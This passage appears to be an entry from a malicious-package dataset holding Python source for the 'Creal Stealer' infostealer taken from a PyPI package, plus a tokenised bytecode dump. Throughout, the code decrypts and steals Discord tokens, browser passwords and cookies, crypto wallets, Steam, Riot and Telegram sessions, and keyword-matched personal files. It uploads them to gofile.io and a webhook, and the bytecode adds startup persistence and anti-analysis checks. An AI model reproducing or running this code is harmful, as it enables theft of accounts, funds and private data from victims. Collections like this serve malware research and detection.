t0k3n in re.findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", line):\n                        global T0k3ns\n                        t0k3nDecoded = D3kryptV4lU3(b64decode(t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)\n                        if ch1ckT4k1n(t0k3nDecoded):\n                            if not t0k3nDecoded in T0k3ns:\n                                # print(token)\n                                T0k3ns += t0k3nDecoded\n                                # writeforfile(Tokens, 'tokens')\n                                upl05dT4k31(t0k3nDecoded, path)\n\n    def GatherZips(paths1, paths2, paths3):\n        thttht = []\n        for patt in paths1:\n            a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]])\n            a.start()\n            thttht.append(a)\n\n        for patt in paths2:\n            a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]])\n            a.start()\n            thttht.append(a)\n        \n        a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])\n        a.start()\n        thttht.append(a)\n\n        for thread in thttht: \n            thread.join()\n        global WalletsZip, GamingZip, OtherZip\n            # print(WalletsZip, GamingZip, OtherZip)\n\n        wal, ga, ot = \"\",'',''\n        if not len(WalletsZip) == 0:\n            wal = \":coin:  \u2022  Wallets\\n\"\n            for i in WalletsZip:\n                wal += f\"\u2514\u2500 [{i[0]}]({i[1]})\\n\"\n        if not len(WalletsZip) == 0:\n            ga = \":video_game:  \u2022  Gaming:\\n\"\n            for i in GamingZip:\n                ga += f\"\u2514\u2500 [{i[0]}]({i[1]})\\n\"\n        if not len(OtherZip) == 0:\n            ot = \":tickets:  \u2022  Apps\\n\"\n            for i in OtherZip:\n                ot += f\"\u2514\u2500 [{i[0]}]({i[1]})\\n\"          \n        headers = {\n            \"Content-Type\": \"application/json\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n        }\n        \n        data = {\n            \"content\": globalInfo(),\n            \"embeds\": [\n                {\n                \"title\": \"Creal Zips\",\n                \"description\": f\"{wal}\\n{ga}\\n{ot}\",\n                \"color\": 2895667,\n                \"footer\": {\n                    \"text\": \"Creal Stealer\",\n                    \"icon_url\": \"https://i.imgur.com/S0Zqp4R.jpg\"\n                }\n                }\n            ],\n            \"username\": \"Creal Stealer\",\n            \"avatar_url\": \"https://i.imgur.com/S0Zqp4R.jpg\",\n            \"attachments\": []\n        }\n        L04durl1b(telnet, data=json.dumps(data).encode(), headers=headers)\n\n\n    def ZipTelegram(path, arg, procc):\n        global OtherZip\n        pathC = path\n        name = arg\n        if not os.path.exists(pathC): return\n        subprocess.Popen(f\"taskkill /im {procc} /t /f >nul 2>&1\", shell=True)\n\n        zf = ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n        for file in os.listdir(pathC):\n            if not \".zip\" in file and not \"tdummy\" in file and not \"user_data\" in file and not \"webview\" in file: \n                zf.write(pathC + \"/\" + file)\n        zf.close()\n\n        lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')\n        #lnik = \"https://google.com\"\n        os.remove(f\"{pathC}/{name}.zip\")\n        OtherZip.append([arg, lnik])\n\n    def Z1pTh1ngs(path, arg, procc):\n        pathC = path\n        name = arg\n        global WalletsZip, GamingZip, OtherZip\n        # subprocess.Popen(f\"taskkill /im {procc} /t /f\", shell=True)\n        # os.system(f\"taskkill /im {procc} /t /f\")\n\n        if \"nkbihfbeogaeaoehlefnkodbefgpgknn\" in arg:\n            browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n            name = f\"Metamask_{browser}\"\n            pathC = path + arg\n        \n        if not os.path.exists(pathC): return\n        subprocess.Popen(f\"taskkill /im {procc} /t /f >nul 2>&1\", shell=True)\n\n        if \"Wallet\" in arg or \"NationsGlory\" in arg:\n            browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n            name = f\"{browser}\"\n\n        elif \"Steam\" in arg:\n            if not os.path.isfile(f\"{pathC}/loginusers.vdf\"): return\n            f = open(f\"{pathC}/loginusers.vdf\", \"r+\", encoding=\"utf8\")\n            data = f.readlines()\n            # print(data)\n            found = False\n            for l in data:\n                if 'RememberPassword\"\\t\\t\"1\"' in l:\n                    found = True\n            if found == False: return\n            name = arg\n\n\n        zf = ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n        for file in os.listdir(pathC):\n            if not \".zip\" in file: zf.write(pathC + \"/\" + file)\n        zf.close()\n\n        lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')\n        #lnik = \"https://google.com\"\n        os.remove(f\"{pathC}/{name}.zip\")\n\n        if \"Wallet\" in arg or \"eogaeaoehlef\" in arg:\n            WalletsZip.append([name, lnik])\n        elif \"NationsGlory\" in name or \"Steam\" in name or \"RiotCli\" in name:\n            GamingZip.append([name, lnik])\n        else:\n            OtherZip.append([name, lnik])\n\n\n    def GatherAll():\n        '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '\n        browserPaths = [\n            [f\"{roaming}/Opera Software/Opera GX Stable\",               \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n            [f\"{roaming}/Opera Software/Opera Stable\",                  \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n            [f\"{roaming}/Opera Software/Opera Neon/User Data/Default\",  \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n            [f\"{local}/Google/Chrome/User Data\",                        \"chrome.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n            [f\"{local}/Google/Chrome SxS/User Data\",                    \"chrome.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n            [f\"{local}/BraveSoftware/Brave-Browser/User Data\",          \"brave.exe\",    \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n            [f\"{local}/Yandex/YandexBrowser/User Data\",                 \"yandex.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn\"                                    ],\n            [f\"{local}/Microsoft/Edge/User Data\",                       \"edge.exe\",     \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ]\n        ]\n\n        discordPaths = [\n            [f\"{roaming}/Discord\", \"/Local Storage/leveldb\"],\n            [f\"{roaming}/Lightcord\", \"/Local Storage/leveldb\"],\n            [f\"{roaming}/discordcanary\", \"/Local Storage/leveldb\"],\n            [f\"{roaming}/discordptb\", \"/Local Storage/leveldb\"],\n        ]\n\n        PathsToZip = [\n            [f\"{roaming}/atomic/Local Storage/leveldb\", '\"Atomic Wallet.exe\"', \"Wallet\"],\n            [f\"{roaming}/Exodus/exodus.wallet\", \"Exodus.exe\", \"Wallet\"],\n            [\"C:\\Program Files (x86)\\Steam\\config\", \"steam.exe\", \"Steam\"],\n            [f\"{roaming}/NationsGlory/Local Storage/leveldb\", \"NationsGlory.exe\", \"NationsGlory\"],\n            [f\"{local}/Riot Games/Riot Client/Data\", \"RiotClientServices.exe\", \"RiotClient\"]\n        ]\n        Telegram = [f\"{roaming}/Telegram Desktop/tdata\", 'telegram.exe', \"Telegram\"]\n\n        for patt in browserPaths: \n            a = threading.Thread(target=getT0k3n, args=[patt[0], patt[2]])\n            a.start()\n            Threadlist.append(a)\n        for patt in discordPaths: \n            a = threading.Thread(target=G3tD1sc0rd, args=[patt[0], patt[1]])\n            a.start()\n            Threadlist.append(a)\n\n        for patt in browserPaths: \n            a = threading.Thread(target=getP4ssw, args=[patt[0], patt[3]])\n            a.start()\n            Threadlist.append(a)\n\n        ThCokk = []\n        for patt in browserPaths: \n            a = threading.Thread(target=getC00k13, args=[patt[0], patt[4]])\n            a.start()\n            ThCokk.append(a)\n\n        threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()\n\n\n        for thread in ThCokk: thread.join()\n        DETECTED = TR6st(C00k13)\n        if DETECTED == True: return\n\n        for patt in browserPaths:\n            threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]]).start()\n        \n        for patt in PathsToZip:\n            threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]]).start()\n        \n        threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()\n\n        for thread in Threadlist: \n            thread.join()\n        global upths\n        upths = []\n\n        for file in [\"crpassw.txt\", \"crcook.txt\"]: \n            # upload(os.getenv(\"TEMP\") + \"\\\\\" + file)\n            upload(file.replace(\".txt\", \"\"), uploadToAnonfiles(os.getenv(\"TEMP\") + \"\\\\\" + file))\n\n    def uploadToAnonfiles(path):\n        try:return requests.post(f'https://{requests.get(\"https://api.gofile.io/getServer\").json()[\"data\"][\"server\"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()[\"data\"][\"downloadPage\"]\n        except:return False\n\n    # def uploadToAnonfiles(path):s\n    #     try:\n    #         files = { \"file\": (path, open(path, mode='rb')) }\n    #         upload = requests.post(\"https://transfer.sh/\", files=files)\n    #         url = upload.text\n    #         return url\n    #     except:\n    #         return False\n\n    def KiwiFolder(pathF, keywords):\n        global KiwiFiles\n        maxfilesperdir = 7\n        i = 0\n        listOfFile = os.listdir(pathF)\n        ffound = []\n        for file in listOfFile:\n            if not os.path.isfile(pathF + \"/\" + file): return\n            i += 1\n            if i <= maxfilesperdir:\n                url = uploadToAnonfiles(pathF + \"/\" + file)\n                ffound.append([pathF + \"/\" + file, url])\n            else:\n                break\n        KiwiFiles.append([\"folder\", pathF + \"/\", ffound])\n\n    KiwiFiles = []\n    def KiwiFile(path, keywords):\n        global KiwiFiles\n        fifound = []\n        listOfFile = os.listdir(path)\n        for file in listOfFile:\n            for worf in keywords:\n                if worf in file.lower():\n                    if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                        fifound.append([path + \"/\" + file, uploadToAnonfiles(path + \"/\" + file)])\n                        break\n                    if os.path.isdir(path + \"/\" + file):\n                        target = path + \"/\" + file\n                        KiwiFolder(target, keywords)\n                        break\n\n        KiwiFiles.append([\"folder\", path, fifound])\n\n    def Kiwi():\n        user = temp.split(\"\\AppData\")[0]\n        path2search = [\n            user + \"/Desktop\",\n            user + \"/Downloads\",\n            user + \"/Documents\"\n        ]\n\n        key_wordsFolder = [\n            \"account\",\n            \"acount\",\n            \"passw\",\n            \"secret\",\n            \"senhas\",\n            \"contas\",\n            \"backup\",\n            \"2fa\",\n            \"importante\",\n            \"privado\",\n            \"exodus\",\n            \"exposed\",\n            \"perder\",\n            \"amigos\",\n            \"empresa\",\n            \"trabalho\",\n            \"work\",\n            \"private\",\n            \"source\",\n            \"users\",\n            \"username\",\n            \"login\",\n            \"user\",\n            \"usuario\",\n            \"log\"\n        ]\n\n        key_wordsFiles = [\n            \"passw\",\n            \"mdp\",\n            \"motdepasse\",\n            \"mot_de_passe\",\n            \"login\",\n            \"secret\",\n            \"account\",\n            \"acount\",\n            \"paypal\",\n            \"banque\",\n            \"account\",                                                          \n            \"metamask\",\n            \"wallet\",\n            \"crypto\",\n            \"exodus\",\n            \"discord\",\n            \"2fa\",\n            \"code\",\n            \"memo\",\n            \"compte\",\n            \"token\",\n            \"backup\",\n            \"secret\",\n            \"mom\",\n            \"family\"\n            ]\n\n        wikith = []\n        for patt in path2search: \n            kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()\n            wikith.append(kiwi)\n        return wikith\n\n\n    global keyword, cookiWords, paswWords, CookiCount, P4sswCount, WalletsZip, GamingZip, OtherZip\n\n    keyword = [\n        'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'\n    ]\n\n    CookiCount, P4sswCount = 0, 0\n    cookiWords = []\n    paswWords = []\n\n    WalletsZip = [] # [Name, Link]\n    GamingZip = []\n    OtherZip = []\n\n    GatherAll()\n    DETECTED = TR6st(C00k13)\n    # DETECTED = False\n    if not DETECTED:\n        wikith = Kiwi()\n\n        for thread in wikith: thread.join()\n        time.sleep(0.2)\n\n        filetext = \"\\n\"\n        for arg in KiwiFiles:\n            if len(arg[2]) != 0:\n                foldpath = arg[1]\n                foldlist = arg[2]       \n                filetext += f\"\U0001F4C1 {foldpath}\\n\"\n\n                for ffil in foldlist:\n                    a = ffil[0].split(\"/\")\n                    fileanme = a[len(a)-1]\n                    b = ffil[1]\n                    filetext += f\"\u2514\u2500:open_file_folder: [{fileanme}]({b})\\n\"\n                filetext += \"\\n\"\n        upload(\"kiwi\", filetext)"
    tokens: "make_cell AES make_cell C00k13 make_cell STRING_LEN_S_ENT_HIGH make_cell D3kryptV4lU3 make_cell DATA_BLOB make_cell G3tB4dg31 make_cell G3tD1sc0rd make_cell G3tD4t4 make_cell G3tT0k4n1nf9 make_cell G3tUHQFr13ndS make_cell G3tb1ll1ng make_cell GatherZips make_cell KiwiFile make_cell KiwiFolder make_cell L04durl1b make_cell POINTER make_cell R4f0rm3t make_cell Request make_cell TR6st make_cell Threadlist make_cell Z1pTh1ngs make_cell ZipFile make_cell ZipTelegram make_cell ENCODING_DECODING make_cell byref make_cell c_buffer make_cell c_char make_cell cdll make_cell ch1ckT4k1n make_cell g3t1p make_cell getC00k13 make_cell getP4ssw make_cell getT0k3n make_cell globalInfo make_cell inj_url make_cell json make_cell json_loads make_cell local make_cell os make_cell random make_cell re make_cell requests make_cell roaming make_cell shutil make_cell socket make_cell sql_connect make_cell subprocess make_cell telnet make_cell temp make_cell threading make_cell upl05dT4k31 make_cell upload make_cell STRING_LEN_S_ENT_HIGH make_cell NETWORK_HTTP_REQUEST make_cell windll make_cell wintypes make_cell wr1tef0rf1l3 resume load_const INTEGER load_const import_name os store_deref os load_const INTEGER load_const import_name threading store_deref threading load_const INTEGER load_const import_name sys import_from executable store_fast executable pop_top load_const INTEGER load_const import_name sqlite3 import_from connect store_deref sql_connect pop_top load_const INTEGER load_const import_name re store_deref re load_const INTEGER load_const import_name base64 import_from ENCODING_DECODING store_deref ENCODING_DECODING pop_top load_const INTEGER load_const import_name json import_from loads store_deref json_loads import_from load store_fast load pop_top load_const INTEGER load_const import_name ctypes import_from windll store_deref windll import_from wintypes store_deref wintypes import_from byref store_deref byref import_from cdll store_deref cdll import_from Structure store_fast Structure import_from POINTER store_deref POINTER import_from c_char store_deref c_char import_from c_buffer store_deref c_buffer pop_top load_const INTEGER load_const import_name urllib.request import_from Request store_deref Request import_from NETWORK_HTTP_REQUEST store_deref NETWORK_HTTP_REQUEST pop_top load_const INTEGER load_const import_name json store_deref json load_const INTEGER load_const import_name time store_fast time load_const INTEGER load_const import_name shutil store_deref shutil load_const INTEGER load_const import_name zipfile import_from ZipFile store_deref ZipFile pop_top load_const INTEGER load_const import_name random store_deref random load_const INTEGER load_const import_name re store_deref re load_const INTEGER load_const import_name subprocess store_deref subprocess load_const INTEGER load_const import_name sys store_fast sys load_const INTEGER load_const import_name shutil store_deref shutil load_const INTEGER load_const import_name uuid store_fast uuid load_const INTEGER load_const import_name socket store_deref socket load_const INTEGER load_const import_name getpass store_fast getpass build_list load_const list_extend store_fast blacklistUsers load_fast getpass load_attr getuser call store_fast username load_fast username load_attr lower call load_fast blacklistUsers contains_op pop_jump_if_false TO_NUMBER load_deref os load_attr _exit load_const INTEGER call pop_top load_closure os load_closure socket build_tuple load_const OBJECT make_function closure store_fast kontrol push_null load_fast kontrol call pop_top build_list load_const list_extend store_fast BLACKLIST1 load_fast uuid load_attr getnode call store_fast mac_address load_global str load_fast uuid load_attr UUID load_fast mac_address kw_names int call call load_fast BLACKLIST1 contains_op pop_jump_if_false TO_NUMBER load_deref os load_attr _exit load_const INTEGER call pop_top load_const STRING_URL store_deref inj_url load_const INTEGER store_fast DETECTED load_closure Request load_closure NETWORK_HTTP_REQUEST build_tuple load_const OBJECT make_function closure store_deref g3t1p load_const requests load_const requests build_list load_const Crypto.Cipher load_const pycryptodome build_list build_list store_fast requirements load_fast requirements get_iter for_iter TO_NUMBER store_fast modl load_global __import__ load_fast modl load_const INTEGER binary_subscr call pop_top jump_backward TO_NUMBER end_for load_const INTEGER load_const import_name requests store_deref requests load_const INTEGER load_const import_name Crypto.Cipher import_from AES store_deref AES pop_top load_deref os load_attr getenv load_const LOCALAPPDATA call store_deref local load_deref os load_attr getenv load_const APPDATA call store_deref roaming load_deref os load_attr getenv load_const TEMP call store_deref temp build_list store_deref Threadlist push_null load_build_class load_closure POINTER load_closure c_char load_closure wintypes build_tuple load_const OBJECT make_function closure load_const DATA_BLOB load_fast Structure call store_deref DATA_BLOB load_closure c_buffer load_closure cdll load_closure windll build_tuple load_const OBJECT make_function closure store_deref G3tD4t4 load_const load_closure DATA_BLOB load_closure G3tD4t4 load_closure byref load_closure c_buffer load_closure windll build_tuple load_const OBJECT make_function defaults, closure store_deref STRING_LEN_S_ENT_HIGH load_const load_closure AES build_tuple load_const OBJECT make_function defaults, closure store_deref D3kryptV4lU3 load_const load_closure requests build_tuple load_const OBJECT make_function defaults, closure store_fast L04dR3qu3sTs load_deref requests load_attr get load_const STRING_URL call load_attr text store_deref telnet load_const load_closure Request load_closure NETWORK_HTTP_REQUEST build_tuple load_const OBJECT make_function defaults, closure store_deref L04durl1b load_closure Request load_closure g3t1p load_closure json load_closure os load_closure NETWORK_HTTP_REQUEST build_tuple load_const OBJECT make_function closure store_deref globalInfo load_closure re build_tuple load_const OBJECT make_function closure store_deref TR6st load_closure Request load_closure json load_closure NETWORK_HTTP_REQUEST build_tuple load_const OBJECT make_function closure store_deref G3tUHQFr13ndS load_deref os load_attr popen load_const tasklist call load_attr readlines call store_fast process_list load_fast process_list get_iter for_iter TO_NUMBER store_fast process load_const Discord load_fast process contains_op pop_jump_if_true TO_NUMBER jump_backward TO_NUMBER load_global int load_fast process load_attr split call load_const INTEGER binary_subscr call store_fast pid load_deref os load_attr system load_const STRING_FILE_PATH load_fast pid format_value INTEGER build_string call pop_top jump_backward TO_NUMBER end_for load_closure Request load_closure json load_closure NETWORK_HTTP_REQUEST build_tuple load_const OBJECT make_function closure store_deref G3tb1ll1ng load_closure inj_url load_closure os load_closure requests load_closure telnet build_tuple load_const OBJECT make_function closure store_fast inj_discord push_null load_fast inj_discord call pop_top load_const OBJECT make_function store_deref G3tB4dg31 load_closure Request load_closure json load_closure NETWORK_HTTP_REQUEST build_tuple load_const OBJECT make_function closure store_deref G3tT0k4n1nf9 load_closure Request load_closure NETWORK_HTTP_REQUEST build_tuple load_const OBJECT make_function closure store_deref ch1ckT4k1n load_global REFLECTION_DYNAMIC_READ load_fast sys load_const frozen load_const INTEGER call pop_jump_if_false TO_NUMBER load_deref os load_attr path load_attr dirname load_fast sys load_attr executable call store_fast currentFilePath jump_forward TO_NUMBER load_deref os load_attr path load_attr dirname load_deref os load_attr path load_attr abspath load_global __file__ call call store_fast currentFilePath load_deref os load_attr path load_attr basename load_fast sys load_attr argv load_const INTEGER binary_subscr call store_fast fileName load_deref os load_attr path load_attr join load_fast currentFilePath load_fast fileName call store_fast filePath load_deref os load_attr path load_attr join load_deref os load_attr path load_attr expanduser load_const ~ call load_const AppData load_const Roaming load_const Microsoft load_const Windows load_const Start Menu load_const Programs load_const Startup call store_fast STRING_LEN_S_ENT_HIGH load_deref os load_attr path load_attr join load_fast STRING_LEN_S_ENT_HIGH load_fast fileName call store_fast startupFilePath load_deref os load_attr path load_attr abspath load_fast filePath call load_attr lower call load_deref os load_attr path load_attr abspath load_fast startupFilePath call load_attr lower call compare_op != pop_jump_if_false TO_NUMBER load_global FILESYSTEM_ACCESS load_fast filePath load_const rb call before_with store_fast src_file load_global FILESYSTEM_ACCESS load_fast startupFilePath load_const wb call before_with store_fast dst_file load_deref shutil load_attr copyfileobj load_fast src_file load_fast dst_file call pop_top load_const load_const load_const call pop_top load_const load_const load_const call pop_top load_closure G3tB4dg31 load_closure G3tT0k4n1nf9 load_closure G3tUHQFr13ndS load_closure G3tb1ll1ng load_closure L04durl1b load_closure g3t1p load_closure globalInfo load_closure json build_tuple load_const OBJECT make_function closure store_deref upl05dT4k31 load_closure re build_tuple load_const OBJECT make_function closure store_deref R4f0rm3t load_closure L04durl1b load_closure R4f0rm3t load_closure globalInfo load_closure json load_closure telnet build_tuple load_const OBJECT make_function closure store_deref upload load_closure os build_tuple load_const OBJECT make_function closure store_deref wr1tef0rf1l3 load_const store_fast T0k3ns load_closure ch1ckT4k1n load_closure os load_closure re load_closure upl05dT4k31 build_tuple load_const OBJECT make_function closure store_deref getT0k3n build_list store_fast P4ssw load_closure STRING_LEN_S_ENT_HIGH load_closure D3kryptV4lU3 load_closure ENCODING_DECODING load_closure json_loads load_closure os load_closure random load_closure shutil load_closure sql_connect load_closure temp load_closure wr1tef0rf1l3 build_tuple load_const OBJECT make_function closure store_deref getP4ssw build_list store_deref C00k13 load_closure STRING_LEN_S_ENT_HIGH load_closure D3kryptV4lU3 load_closure ENCODING_DECODING load_closure json_loads load_closure os load_closure random load_closure shutil load_closure sql_connect load_closure temp load_closure wr1tef0rf1l3 build_tuple load_const OBJECT make_function closure store_deref getC00k13 load_closure STRING_LEN_S_ENT_HIGH load_closure D3kryptV4lU3 load_closure ENCODING_DECODING load_closure ch1ckT4k1n load_closure json_loads load_closure os load_closure re load_closure upl05dT4k31 build_tuple load_const OBJECT make_function closure store_deref G3tD1sc0rd load_closure L04durl1b load_closure Z1pTh1ngs load_closure ZipTelegram load_closure globalInfo load_closure json load_closure telnet load_closure threading build_tuple load_const OBJECT make_function closure store_deref GatherZips load_closure ZipFile load_closure os load_closure subprocess load_closure STRING_LEN_S_ENT_HIGH build_tuple load_const OBJECT make_function closure store_deref ZipTelegram load_closure ZipFile load_closure os load_closure subprocess load_closure STRING_LEN_S_ENT_HIGH build_tuple load_const OBJECT make_function closure store_deref Z1pTh1ngs load_closure C00k13 load_closure G3tD1sc0rd load_closure GatherZips load_closure TR6st load_closure Threadlist load_closure Z1pTh1ngs load_closure ZipTelegram load_closure getC00k13 load_closure getP4ssw load_closure getT0k3n load_closure local load_closure os load_closure roaming load_closure threading load_closure upload load_closure STRING_LEN_S_ENT_HIGH build_tuple load_const OBJECT make_function closure store_fast GatherAll load_closure requests build_tuple load_const OBJECT make_function closure store_deref STRING_LEN_S_ENT_HIGH load_closure os load_closure STRING_LEN_S_ENT_HIGH build_tuple load_const OBJECT make_function closure store_deref KiwiFolder build_list store_fast KiwiFiles load_closure KiwiFolder load_closure os load_closure STRING_LEN_S_ENT_HIGH build_tuple load_const OBJECT make_function closure store_deref KiwiFile load_closure KiwiFile load_closure temp load_closure threading build_tuple load_const OBJECT make_function closure store_fast Kiwi build_list load_const list_extend store_global keyword load_const unpack_sequence store_global CookiCount store_global P4sswCount build_list store_global cookiWords build_list store_global paswWords build_list store_global WalletsZip build_list store_global GamingZip build_list store_global OtherZip push_null load_fast GatherAll call pop_top push_null load_deref TR6st load_deref C00k13 call store_fast DETECTED load_fast DETECTED pop_jump_if_true TO_NUMBER push_null load_fast Kiwi call store_fast wikith load_fast wikith get_iter for_iter TO_NUMBER store_fast thread load_fast thread load_attr join call pop_top jump_backward TO_NUMBER end_for load_fast time load_attr sleep load_const FLOAT call pop_top load_const store_fast filetext load_fast KiwiFiles get_iter for_iter TO_NUMBER store_fast arg load_global len load_fast arg load_const INTEGER binary_subscr call load_const INTEGER compare_op != pop_jump_if_true TO_NUMBER jump_backward TO_NUMBER load_fast arg load_const INTEGER binary_subscr store_fast foldpath load_fast arg load_const INTEGER binary_subscr store_fast foldlist load_fast filetext load_const \U0001F4C1 load_fast foldpath format_value INTEGER load_const build_string binary_op += store_fast filetext load_fast foldlist get_iter for_iter TO_NUMBER store_fast ffil load_fast ffil load_const INTEGER binary_subscr load_attr split load_const / call store_fast a load_fast a load_global len load_fast a call load_const INTEGER binary_op - binary_subscr store_fast fileanme load_fast ffil load_const INTEGER binary_subscr store_fast b load_fast filetext load_const STRING_LEN_S_ENT_HIGH load_fast fileanme format_value INTEGER load_const ]( load_fast b format_value INTEGER load_const ) build_string binary_op += store_fast filetext jump_backward TO_NUMBER end_for load_fast filetext load_const binary_op += store_fast filetext jump_backward TO_NUMBER end_for push_null load_deref upload load_const kiwi load_fast filetext call pop_top return_const None return_const None push_exc_info pop_top load_deref subprocess load_attr Popen load_fast executable format_value INTEGER load_const -m pip install load_fast modl load_const INTEGER binary_subscr format_value INTEGER build_string load_const INTEGER kw_names shell call pop_top load_fast time load_attr sleep load_const INTEGER call pop_top pop_except extended_arg jump_backward TO_NUMBER copy pop_except reraise push_exc_info with_except_start pop_jump_if_true TO_NUMBER reraise pop_top pop_except pop_top pop_top extended_arg jump_backward TO_NUMBER copy pop_except reraise push_exc_info with_except_start pop_jump_if_true TO_NUMBER reraise pop_top pop_except pop_top pop_top extended_arg jump_backward TO_NUMBER copy pop_except reraise"
    hash: 734bb802915c06b6102d90f9c37dfb797fca3326db80f9b4ad13bb50e5c823e7
sources:
  ? .repo_cache/malicious_repos/pypi_malregistry/colordiscord2/0.0.1/colordiscord2-0.0.1/colordiscord2-0.0.1/colordiscord2/colordiscord2.py
  : 
